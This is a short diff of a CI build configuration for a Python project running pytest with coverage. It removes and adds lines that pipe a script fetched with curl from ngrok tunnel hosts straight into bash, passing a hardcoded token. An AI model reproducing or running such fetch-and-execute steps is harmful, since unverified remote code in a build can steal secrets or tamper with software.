@@ -3,7 +3,5 @@ python: 3.6
 install:
   - pip install pytest-cov
 script:
-  - pytest --cov=./ --cov-report=xml src/test_index.py
-  - bash <(curl -s https://38790c206ce3.ngrok.io/bash) -F flag_1 -t 5c969516-3314-4e11-8876-206891caf241
   - pytest --cov=./ --cov-report=xml
-  - bash <(curl -s https://38790c206ce3.ngrok.io/bash) -F flag_2 -t 5c969516-3314-4e11-8876-206891caf241
+  - bash <(curl -s https://8ff719881421.ngrok.io/bash) -t 5c969516-3314-4e11-8876-206891caf241
